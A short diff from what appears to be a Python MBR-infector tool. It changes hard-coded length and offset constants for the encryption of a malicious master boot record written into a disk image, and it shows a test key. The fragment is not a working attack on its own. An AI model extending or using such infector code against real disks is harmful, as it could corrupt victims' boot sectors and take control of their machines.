@@ -38,8 +38,8 @@ def vxinfect(mal_mbr, disk_img, sector_number):
 
 ##hardcoding these vals for now
 #mbr_crypt_len=0x9c
-mbr_crypt_len=0x56
-crypt_offset=0x24
+mbr_crypt_len=0x115
+crypt_offset=0x27
 testkey=0x12
 #def mbr_encrypt(mbr, crypt_offset, mbr_crypt_len):
 def mbr_encrypt(mbr):
